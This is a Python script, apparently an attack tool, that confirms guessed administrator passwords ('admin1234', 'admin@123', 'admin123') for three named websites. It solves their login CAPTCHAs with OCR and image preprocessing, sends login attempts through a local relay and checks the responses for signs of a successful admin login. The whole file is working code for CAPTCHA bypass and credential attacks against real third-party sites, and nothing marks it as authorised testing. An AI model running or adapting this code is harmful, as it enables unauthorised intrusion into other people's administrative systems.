#!/usr/bin/env python3
"""verify_hits2.py - 严格验证3个HIT (81.70登录+cookie访问后台)
用loginpost的cookie jar, 登录后再访问后台页面确认
"""
import urllib.request, urllib.parse, ssl, re, sys, time, io
import ddddocr
from PIL import Image

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
HOST = 'http://127.0.0.1:13080'

ocr = ddddocr.DdddOcr(show_ad=False)
ocrb = ddddocr.DdddOcr(show_ad=False, beta=True)

def fetch(url, timeout=25):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout, context=ctx)
        return r.read(50000)
    except Exception:
        return b''

def verify(dom, tpl, pw, label):
    print('=== %s admin/%s ===' % (dom, pw), flush=True)
    getcap = HOST + ('/getcap2.php?d=' if tpl == 'A' else '/getcap_sz.php?d=') + urllib.parse.quote(dom)
    capimg = HOST + ('/ys_cap2.jpg' if tpl == 'A' else '/sz_cap.jpg')
    login = HOST + ('/loginpost2.php?d=' if tpl == 'A' else '/login_sz.php?d=') + urllib.parse.quote(dom)
    for attempt in range(12):
        out = fetch(getcap)
        if b'SAVED:' not in out:
            continue
        img = fetch(capimg)
        if not img or len(img) < 50:
            continue
        try:
            c1 = ocr.classification(img)
            im = Image.open(io.BytesIO(img)).convert('L')
            im = im.resize((im.width * 6, im.height * 6), Image.LANCZOS)
            im = im.point(lambda p: 255 if p > 120 else 0)
            buf = io.BytesIO(); im.save(buf, 'PNG')
            c2 = ocrb.classification(buf.getvalue())
        except Exception:
            continue
        code = c1 if c1 == c2 else (c2 if len(c2) == 4 else c1)
        if tpl == 'A':
            out = fetch(login + '&p=' + urllib.parse.quote(pw) + '&c=' + code)
        else:
            out = fetch(login + '&u=admin&p=' + urllib.parse.quote(pw) + '&c=' + code)
        idx = out.find(b'GIF89a')
        body = out[idx+6:] if idx > 0 else out
        text = body.decode('gb2312', 'ignore') if body else ''
        if '楠璇' in text or '确认码' in text or '不一致' in text or '验证码' in text:
            continue
        print('  login resp len=%d: %s' % (len(body), text[:120].replace(chr(10), ' ')), flush=True)
        if len(body) == 0:
            # 空响应: 重试3次确认
            stable_empty = True
            for r2 in range(3):
                time.sleep(2)
                out3 = fetch(login + ('&p=' if tpl == 'A' else '&u=admin&p=') + urllib.parse.quote(pw) + '&c=' + code)
                idx3 = out3.find(b'GIF89a')
                body3 = out3[idx3+6:] if idx3 > 0 else out3
                text3 = body3.decode('gb2312', 'ignore') if body3 else ''
                if '楠璇' in text3 or '确认码' in text3 or '验证码' in text3:
                    stable_empty = False
                    print('  round%d: captcha err (not hit)' % r2, flush=True)
                    break
                if len(body3) > 0:
                    stable_empty = False
                    print('  round%d: non-empty %s' % (r2, text3[:80].replace(chr(10), ' ')), flush=True)
                    break
                print('  round%d: empty again' % r2, flush=True)
            if stable_empty:
                print('  !!! STABLE EMPTY - possible HIT', flush=True)
            return
        # 非空: 看是否成功页
        if '管理' in text or '欢迎' in text or '成功' in text:
            print('  !!! HIT RESPONSE: %s' % text[:150].replace(chr(10), ' '), flush=True)
        return
    print('  no clean response', flush=True)

verify('www.yangsha.com', 'A', 'admin1234', 'yangsha')
print('')
verify('szsadwj.com', 'B', 'admin@123', 'szsadwj')
print('')
verify('gdcq119.com', 'B', 'admin123', 'gdcq119')
print('=== done ===')
